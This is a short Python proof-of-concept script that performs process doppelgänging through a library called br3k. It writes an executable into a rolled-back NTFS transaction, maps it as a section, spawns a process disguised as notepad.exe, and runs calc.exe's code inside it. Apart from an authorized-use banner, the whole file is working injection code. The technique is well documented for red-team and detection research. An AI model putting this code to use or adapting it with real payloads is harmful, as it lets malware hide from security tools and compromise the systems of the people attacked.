# =============================================================================
# IMPORTANT USAGE NOTICE
# 1. Use only for authorized, non-malicious education, research, and testing.
# =============================================================================

import br3k
from br3k import ProcessVmWriteStrategy, FsFileMode, FsSectionMode

ORIGINAL_IMAGE_FILEPATH = "C:\\Windows\\notepad.exe"
INJECTED_IMAGE_FILEPATH = "C:\\Windows\\System32\\calc.exe"

if __name__ == "__main__":

    print("Script: Inject via process doppelganging")
    print()

    br3k.init_sysapi()

    temp_image_path = br3k.fs_get_temp_path("br3k_doppel_image.exe")
    injected_image = br3k.FileMapping(INJECTED_IMAGE_FILEPATH)

    tx = br3k.Transaction("TH")
    tx.create()

    tx.set()
    handle = br3k.fs_create_file(temp_image_path, file_mode=FsFileMode.ReadWrite)
    tx.unset()

    br3k.fs_write_file(handle, data=injected_image.data, size=injected_image.size)
    del handle

    tx.set()
    handle = br3k.fs_open_file(temp_image_path)
    tx.unset()

    section_handle = br3k.fs_create_file_section(handle, sect_mode=FsSectionMode.Execute)
    del handle

    tx.rollback()

    process = br3k.Process(
        section_handle=section_handle,
        process_vm_write_strategy=ProcessVmWriteStrategy.AllocateInAddr
    )

    process.create()

    proc_params = br3k.PRTL_USER_PROCESS_PARAMETERS(filepath=ORIGINAL_IMAGE_FILEPATH)
    basic_info = process.get_basic_info()

    process.init_memory()
    process.write_peb_proc_params(basic_info.PebBaseAddress, proc_params)

    injected_pe = br3k.Pe(
        data=injected_image.data,
        size=injected_image.size,
        is_file = True
    )

    peb = process.read_peb()
    thread = br3k.Thread(process)
    thread.create(ep=peb.ImageBaseAddress + injected_pe.ep_address())
